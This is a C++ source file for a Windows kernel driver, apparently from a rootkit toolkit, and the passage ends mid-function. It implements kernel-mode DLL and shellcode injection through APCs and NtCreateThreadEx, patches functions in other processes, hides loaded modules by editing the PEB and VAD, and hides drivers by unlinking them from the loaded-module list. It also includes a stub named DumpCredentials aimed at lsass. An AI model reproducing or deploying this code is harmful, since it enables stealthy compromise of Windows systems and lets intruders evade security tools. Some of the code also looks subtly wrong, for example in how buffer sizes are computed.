#include "pch.h"
#include "MemoryUtils.hpp"
#include "MemoryAllocator.hpp"

MemoryUtils::MemoryUtils() {
	this->hiddenDrivers.Count = 0;
	this->NtCreateThreadEx = NULL;
	this->ssdt = NULL;

	if (NT_SUCCESS(GetSSDTAddress()))
		this->NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");

	memset(this->hiddenDrivers.Items, 0, sizeof(this->hiddenDrivers.Items));
	this->hiddenDrivers.Lock.Init();
}

MemoryUtils::~MemoryUtils() {
	AutoLock lock(this->hiddenDrivers.Lock);

	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++) {
		RemoveHiddenDriver(i);
	}

	memset(&this->hiddenDrivers, 0, this->hiddenDrivers.Count);
	this->hiddenDrivers.Count = 0;
}

/*
* Description:
* InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
*
* Parameters:
* @DllInfo [DllInformation*] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
	ShellcodeInformation ShellcodeInfo{};
	PVOID shellcode = NULL;
	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		return status;

	shellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	// Filling the shellcode from the template.
	status = KeWriteProcessMemory(&shellcodeTemplate, PsGetCurrentProcess(), shellcode, shellcodeSize, KernelMode);

	if (!NT_SUCCESS(status)) {
		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
		return status;
	}

	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);
	
	if (!NT_SUCCESS(status)) {
		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
		return status;
	}

	// Creating the shellcode information for APC injection.
	ShellcodeInfo.Parameter1 = NULL;
	ShellcodeInfo.Parameter2 = NULL;
	ShellcodeInfo.Parameter3 = NULL;
	ShellcodeInfo.Pid = DllInfo->Pid;
	ShellcodeInfo.Shellcode = shellcode;
	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	status = InjectShellcodeAPC(&ShellcodeInfo);

	return status;
}

/*
* Description:
* InjectDllThread is responsible to inject a dll in a certain usermode process with NtCreateThreadEx.
*
* Parameters:
* @DllInfo [DllInformation*] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid{};
	KAPC_STATE state;
	HANDLE hProcess = NULL;
	HANDLE hTargetThread = NULL;
	PEPROCESS TargetProcess = NULL;
	PVOID remoteAddress = NULL;
	HANDLE pid = UlongToHandle(DllInfo->Pid);
	SIZE_T pathLength = strlen(DllInfo->DllPath) + 1;
	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		return status;

	KeStackAttachProcess(TargetProcess, &state);
	PVOID kernel32Base = GetModuleBase(TargetProcess, L"C:\\Windows\\System32\\kernel32.dll");

	if (!kernel32Base) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(TargetProcess);
		return STATUS_ABANDONED;
	}

	PVOID loadLibraryAddress = GetFunctionAddress(kernel32Base, "LoadLibraryA");

	if (!loadLibraryAddress) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(TargetProcess);
		return STATUS_ABANDONED;
	}
	KeUnstackDetachProcess(&state);

	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(TargetProcess);
		return status;
	}

	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &pathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status)) {
		ZwClose(hProcess);
		ObDereferenceObject(TargetProcess);
		return status;
	}

	pathLength = strlen(DllInfo->DllPath) + 1;

	status = KeWriteProcessMemory(&(DllInfo->DllPath), TargetProcess, remoteAddress, pathLength, KernelMode);

	if (!NT_SUCCESS(status)) {
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
		ZwClose(hProcess);
		ObDereferenceObject(TargetProcess);
		return status;
	}

	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
	CHAR tmpPreviousMode = *previousMode;
	*previousMode = KernelMode;
	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)loadLibraryAddress, remoteAddress, 0, NULL, NULL, NULL, NULL);
	*previousMode = tmpPreviousMode;

	if (hTargetThread)
		ZwClose(hTargetThread);

	if (!NT_SUCCESS(status))
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);

	ZwClose(hProcess);
	ObDereferenceObject(TargetProcess);
	return status;
}

/*
* Description:
* InjectShellcodeAPC is responsible to inject a shellcode in a certain usermode process.
*
* Parameters:
* @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
*
* Returns:
* @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid{};
	HANDLE hProcess = NULL;
	PEPROCESS TargetProcess = NULL;
	PETHREAD TargetThread = NULL;
	PKAPC ShellcodeApc = NULL;
	PKAPC PrepareApc = NULL;
	PVOID shellcodeAddress = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;

	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
	status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		return status;

	// Find APC suitable thread.
	status = FindAlertableThread(pid, &TargetThread);

	do {
		if (!NT_SUCCESS(status) || !TargetThread) {
			if (NT_SUCCESS(status))
				status = STATUS_NOT_FOUND;
			break;
		}

		// Allocate and write the shellcode.
		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
		cid.UniqueProcess = pid;
		cid.UniqueThread = NULL;

		status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

		if (!NT_SUCCESS(status))
			break;

		status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

		if (!NT_SUCCESS(status))
			break;
		shellcodeSize = ShellcodeInfo->ShellcodeSize;

		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);

		if (!NT_SUCCESS(status))
			break;

		// Create and execute the APCs.
		ShellcodeApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
		PrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);

		if (!ShellcodeApc || !PrepareApc) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
		KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);

		if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (!KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (PsIsThreadTerminating(TargetThread))
			status = STATUS_THREAD_IS_TERMINATING;

	} while (false);


	if (!NT_SUCCESS(status)) {
		if (shellcodeAddress)
			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
		if (PrepareApc)
			ExFreePoolWithTag(PrepareApc, DRIVER_TAG);
		if (ShellcodeApc)
			ExFreePoolWithTag(ShellcodeApc, DRIVER_TAG);
	}

	if (TargetThread)
		ObDereferenceObject(TargetThread);

	if (TargetProcess)
		ObDereferenceObject(TargetProcess);

	if (hProcess)
		ZwClose(hProcess);

	return status;
}

/*
* Description:
* InjectShellcodeThread is responsible to inject a shellcode in a certain usermode process with NtCreateThreadEx.
*
* Parameters:
* @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid{};
	HANDLE hProcess = NULL;
	HANDLE hTargetThread = NULL;
	PEPROCESS TargetProcess = NULL;
	PVOID remoteAddress = NULL;
	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;
	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		return status;

	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	do {
		if (!NT_SUCCESS(status))
			break;

		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

		if (!NT_SUCCESS(status))
			break;

		shellcodeSize = ShellcodeInfo->ShellcodeSize;
		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);

		if (!NT_SUCCESS(status))
			break;

		// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
		PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
		CHAR tmpPreviousMode = *previousMode;
		*previousMode = KernelMode;
		status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
		*previousMode = tmpPreviousMode;

	} while (false);

	if (hTargetThread)
		ZwClose(hTargetThread);

	if (!NT_SUCCESS(status) && remoteAddress)
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);

	if (hProcess)
		ZwClose(hProcess);

	if (TargetProcess)
		ObDereferenceObject(TargetProcess);

	return status;
}

/*
* Description:
* PatchModule is responsible for patching a certain moudle in a certain process.
*
* Parameters:
* @ModuleInformation [PatchedModule*] -- All the information regarding the module that needs to be patched.
*
* Returns:
* @status			 [NTSTATUS]		  -- Whether successfuly patched or not.
*/
NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
	PEPROCESS TargetProcess;
	KAPC_STATE state;
	PVOID functionAddress = NULL;
	PVOID moduleImageBase = NULL;
	WCHAR* moduleName = NULL;
	CHAR* functionName = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize, PagedPool);
	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);
	
	if (!NT_SUCCESS(status))
		return status;

	SIZE_T functionNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
	MemoryAllocator<CHAR*> functionNameAllocator(&functionName, functionNameSize, PagedPool);
	status = functionNameAllocator.CopyData(ModuleInformation->FunctionName, functionNameSize);

	if (!NT_SUCCESS(status))
		return status;

	status = PsLookupProcessByProcessId((HANDLE)ModuleInformation->Pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		return status;

	// Getting the PEB.
	KeStackAttachProcess(TargetProcess, &state);
	moduleImageBase = GetModuleBase(TargetProcess, moduleName);

	if (!moduleImageBase) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(TargetProcess);
		return STATUS_UNSUCCESSFUL;
	}

	functionAddress = GetFunctionAddress(moduleImageBase, functionName);

	if (!functionAddress) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(TargetProcess);
		return STATUS_UNSUCCESSFUL;
	}
	KeUnstackDetachProcess(&state);

	status = KeWriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, KernelMode);
	ObDereferenceObject(TargetProcess);
	return status;
}

/*
* Description:
* HideModule is responsible for hiding user mode module that is loaded in a process.
*
* Parameters:
* @ModuleInformation [HiddenModuleInformation*] -- Required information, contains PID and module's name.
*
* Returns:
* @status			 [NTSTATUS]					-- Whether successfuly hidden or not.
*/
NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
	PLDR_DATA_TABLE_ENTRY pebEntry;
	KAPC_STATE state;
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS targetProcess = NULL;
	LARGE_INTEGER time = { 0 };
	PVOID moduleBase = NULL;
	WCHAR* moduleName = NULL;
	time.QuadPart = -100ll * 10 * 1000;

	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize, PagedPool);
	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);

	if (!NT_SUCCESS(status))
		return status;

	// Getting the process's PEB.
	status = PsLookupProcessByProcessId(ULongToHandle(ModuleInformation->Pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	KeStackAttachProcess(targetProcess, &state);
	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(targetProcess);

	if (!targetPeb) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(targetProcess);
		return STATUS_ABANDONED;
	}

	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
		KeDelayExecutionThread(KernelMode, FALSE, &time);
	}

	if (!targetPeb->LoaderData) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(targetProcess);
		return STATUS_ABANDONED_WAIT_0;
	}

	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(targetProcess);
		return STATUS_ABANDONED_WAIT_0;
	}

	// Finding the module inside the process.
	status = STATUS_NOT_FOUND;

	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
		pListEntry = pListEntry->Flink) {

		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (pebEntry) {
			if (pebEntry->FullDllName.Length > 0) {
				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
					moduleBase = pebEntry->DllBase;
					RemoveEntryList(&pebEntry->InLoadOrderLinks);
					RemoveEntryList(&pebEntry->InInitializationOrderLinks);
					RemoveEntryList(&pebEntry->InMemoryOrderLinks);
					RemoveEntryList(&pebEntry->HashLinks);
					status = STATUS_SUCCESS;
					break;
				}
			}
		}
	}
	KeUnstackDetachProcess(&state);

	if (NT_SUCCESS(status))
		status = VadHideObject(targetProcess, (ULONG_PTR)moduleBase);

	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* HideDriver is responsible for hiding a kernel driver.
*
* Parameters:
* @DriverInformation [HiddenDriverInformation*] -- Required information, contains the driver's information.
*
* Returns:
* @status			 [NTSTATUS]					-- Whether successfuly hidden or not.
*/
NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation* DriverInformation) {
	HiddenDriverItem hiddenDriver{};
	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
	NTSTATUS status = STATUS_NOT_FOUND;

	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
		return STATUS_ABANDONED;

	for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
		pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
		pListEntry = pListEntry->Flink) {

		loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, DriverInformation->DriverName,
						loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {

			// Copying the original entry to make sure it can be restored again.
			hiddenDriver.DriverName = DriverInformation->DriverName;
			hiddenDriver.originalEntry = loadedModulesEntry;

			if (!AddHiddenDriver(hiddenDriver)) {
				status = STATUS_ABANDONED;
				break;
			}

			RemoveEntryList(&loadedModulesEntry->InLoadOrderLinks);
			status = STATUS_SUCCESS;
			break;
		}
	}

	ExReleaseResourceLite(PsLoadedModuleResource);
	return status;
}

/*
* Description:
* UnhideDriver is responsible for restoring a kernel driver.
*
* Parameters:
* @DriverInformation [HiddenDriverInformation*] -- Required information, contains the driver's information.
*
* Returns:
* @status			 [NTSTATUS]					-- Whether successfuly unhidden or not.
*/
NTSTATUS MemoryUtils::UnhideDriver(HiddenDriverInformation* DriverInformation) {
	HiddenDriverItem hiddenDriver{};
	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
	NTSTATUS status = STATUS_NOT_FOUND;

	hiddenDriver.DriverName = DriverInformation->DriverName;
	ULONG driverIndex = FindHiddenDriver(hiddenDriver);

	if (driverIndex == ITEM_NOT_FOUND)
		return status;

	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
		return STATUS_ABANDONED;

	PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, (PLIST_ENTRY)(this->hiddenDrivers.Items[driverIndex].originalEntry));

	if (RemoveHiddenDriver(driverIndex))
		status = STATUS_SUCCESS;

	ExReleaseResourceLite(PsLoadedModuleResource);
	return status;
}

/*
* Description:
* DumpCredentials is responsible for dumping credentials from lsass.
*
* Parameters:
* @LsassInformation [LsassInformation*] -- Output information to decrypt credentials.
*
* Returns:
* @status			[NTSTATUS]			-- Whether successfuly dumped or not.
*/
NTSTATUS DumpCredentials(LsassInformation* LsassInformation) {
	NTSTATUS status = STATUS_SUCCESS;

	return status;
}

/*
* Description:
* KeWriteProcessMemory is responsible for writing data to any target process.
*
* Parameters:
* @sourceDataAddress [PVOID]	 -- The address of data to write.
* @TargetProcess	 [PEPROCESS] -- Target process to write.
* @targetAddress	 [PVOID]	 -- Target address to write.
* @dataSize			 [SIZE_T]	 -- Size of data to write.
* @mode			     [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
*
* Returns:
* @status			 [NTSTATUS]	 -- Whether successfuly written or not.
*/
NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
	HANDLE hTargetProcess;
	ULONG oldProtection;
	SIZE_T patchLen;
	SIZE_T bytesWritten;
	NTSTATUS status = STATUS_SUCCESS;

	if (mode != KernelMode && mode != UserMode)
		return STATUS_UNSUCCESSFUL;

	// Making sure that the given kernel mode address is valid.
	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
		status = STATUS_UNSUCCESSFUL;
		return status;
	}
	else if (mode == UserMode && (!VALID_USERMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
		status = STATUS_UNSUCCESSFUL;
		return status;
	}

	// Adding write permissions.
	status = ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess);

	if (!NT_SUCCESS(status)) {
		return status;
	}

	patchLen = dataSize;
	PVOID addressToProtect = targetAddress;
	status = ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);

	if (!NT_SUCCESS(status)) {
		ZwClose(hTargetProcess);
		return status;
	}
	ZwClose(hTargetProcess);

	// Writing the data.
	status = MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);

	// Restoring permissions and cleaning up.
	if (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess) == STATUS_SUCCESS) {
		patchLen = dataSize;
		ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
		ZwClose(hTargetProcess);
	}

	return status;
}

/*
* Description:
* KeReadProcessMemory is responsible for read data from any target process.
*
* Parameters:
* @Process		 [PEPROCESS] -- Process to read data from.
* @sourceAddress [PVOID]	 -- Address to read data from.
* @targetAddress [PVOID]     -- Address to read data to.
* @dataSize		 [SIZE_T]	 -- Size of data to read.
* @mode			 [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
*
* Returns:
* @status		 [NTSTATUS]	 -- Whether successfuly read or not.
*/
NTSTATUS MemoryUtils::KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
	SIZE_T bytesRead;

	if (mode != KernelMode && mode != UserMode)
		return STATUS_UNSUCCESSFUL;

	// Making sure that the given kernel mode address is valid.
	if (mode == KernelMode && !VALID_KERNELMODE_MEMORY((DWORD64)targetAddress))
		return STATUS_UNSUCCESSFUL;
	else if (mode == UserMode && !VALID_USERMODE_MEMORY((DWORD64)targetAddress))
		return STATUS_UNSUCCESSFUL;

	return MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
}

/*
* Description:
* VadHideObject is responsible for hiding a specific node inside a VAD tree.
*
* Parameters:
* @Process			 [PEPROCESS] -- Target to process to search on its VAD.
* @TargetAddress	 [ULONG_PTR] -- Virtual address of the module to hide.
*
* Returns:
* @status			 [NTSTATUS]  -- STATUS_SUCCESS is hidden else error.
*/
NTSTATUS MemoryUtils::VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress) {
	PRTL_BALANCED_NODE node = NULL;
	PMMVAD_SHORT shortNode = NULL;
	PMMVAD longNode = NULL;
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	ULONG_PTR targetAddressStart = TargetAddress >> PAGE_SHIFT;

	// Finding the VAD node associated with the target address.
	ULONG vadRootOffset = GetVadRootOffset();
	ULONG pageCommitmentLockOffset = GetPageCommitmentLockOffset(); 

	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
		return STATUS_INVALID_ADDRESS;

	PRTL_AVL_TABLE vadTable = (PRTL_AVL_TABLE)((PUCHAR)Process + vadRootOffset);
	EX_PUSH_LOCK pageTableCommitmentLock = (EX_PUSH_LOCK)((PUCHAR)Process + pageCommitmentLockOffset);
	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &node, &pageTableCommitmentLock);

	if (res != TableFoundNode)
		return STATUS_NOT_FOUND;

	shortNode = (PMMVAD_SHORT)node;

	// Hiding the image name or marking the area as no access.
	if (shortNode->u.VadFlags.VadType == VadImageMap) {
		longNode = (PMMVAD)shortNode;

		if (!longNode->Subsection)
			return STATUS_INVALID_ADDRESS;

		if (!longNode->Subsection->ControlArea || !longNode->Subsection->ControlArea->FilePointer.Object)
			return STATUS_INVALID_ADDRESS;

		PFILE_OBJECT fileObject = (PFILE_OBJECT)(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);

		if (fileObject->FileName.Length > 0)
			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);

		status = STATUS_SUCCESS;
	}
	else if (shortNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
		shortNode->u.VadFlags.Protection = NO_ACCESS;
		status = STATUS_SUCCESS;
	}
	return status;
}

/*
* Description:
* VadFindNodeOrParent is responsible for finding a node inside the VAD tree.
*
* Parameters:
* @Table			 [PRTL_AVL_TABLE]	   -- The table to search for the specific 
* @TargetPageAddress [ULONG_PTR]		   -- The start page address of the searched mapped object.
* @OutNode			 [PRTL_BALANCED_NODE*] -- NULL if wasn't find, else the result described in the Returns section.
*
* Returns:
* @result			 [TABLE_SEARCH_RESULT] -- 
* TableEmptyTree if the tree was empty
* TableFoundNode if the key is found and the OutNode is the result node
* TableInsertAsLeft / TableInsertAsRight if the node was not found and the OutNode contains what will be the out node (right or left respectively).
*/
TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode, EX_PUSH_LOCK* PageTableCommitmentLock) {
	PRTL_BALANCED_NODE child = NULL;
	PRTL_BALANCED_NODE nodeToCheck = NULL;
	PMMVAD_SHORT virtualAddressToCompare = NULL;
	ULONG_PTR startAddress = 0;
	ULONG_PTR endAddress = 0;
	TABLE_SEARCH_RESULT result = TableEmptyTree;

	if (Table->NumberGenericTableElements == 0 && Table->DepthOfTree == 0)
		return result;

	ExAcquirePushLockExclusiveEx(PageTableCommitmentLock, 0);
	nodeToCheck = (PRTL_BALANCED_NODE)(&Table->BalancedRoot);

	while (true) {
		if (!nodeToCheck)
			break;

		virtualAddressToCompare = (PMMVAD_SHORT)nodeToCheck;
		startAddress = (ULONG_PTR)virtualAddressToCompare->StartingVpn;
		endAddress = (ULONG_PTR)virtualAddressToCompare->EndingVpn;

		startAddress |= (ULONG_PTR)virtualAddressToCompare->StartingVpnHigh << 32;
		endAddress |= (ULONG_PTR)virtualAddressToCompare->EndingVpnHigh << 32;

		if (TargetPageAddress < startAddress) {
			child = nodeToCheck->Left;

			if (child) {
				nodeToCheck = child;
				continue;
			}
			*OutNode = nodeToCheck;
			result = TableInsertAsLeft;
			break;
		}
		else if (TargetPageAddress <= endAddress) {
			*OutNode = nodeToCheck;
			result = TableFoundNode;
			break;
		}
		else {
			child = nodeToCheck->Right;

			if (child) {
				nodeToCheck = child;
				continue;
			}

			*OutNode = nodeToCheck;
			result = TableInsertAsRight;
			break;
		}
	}

	ExReleasePushLockExclusiveEx(PageTableCommitmentLock, 0);
	return result;
}

/*
* Description:
* GetModuleBase is responsible for getting the base address of given module inside a given process.
*
* Parameters:
* @Process    [PEPROCESS] -- The process to search on.
* @moduleName [WCHAR*]	  -- Module's name to search.
*
* Returns:
* @moduleBase [PVOID]	  -- Base address of the module if found, else null.
*/
PVOID MemoryUtils::GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
	PVOID moduleBase = NULL;
	LARGE_INTEGER time = { 0 };
	time.QuadPart = -100ll * 10 * 1000;

	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(Process);

	if (!targetPeb)
		return moduleBase;

	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
		KeDelayExecutionThread(KernelMode, FALSE, &time);
	}

	if (!targetPeb->LoaderData)
		return moduleBase;

	// Getting the module's image base.
	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
		pListEntry = pListEntry->Flink) {

		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (pEntry->FullDllName.Length > 0) {
			if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
				moduleBase = pEntry->DllBase;
				break;
			}
		}
	}

	return moduleBase;
}

/*
* Description:
* GetFunctionAddress is responsible for getting the function address inside given module from its EAT.
*
* Parameters:
* @moduleBase      [PVOID] -- Module's image base address.
* @functionName    [CHAR*] -- Function name to search.
*
* Returns:
* @functionAddress [PVOID] -- Function address if found, else null.
*/
PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
	PVOID functionAddress = NULL;
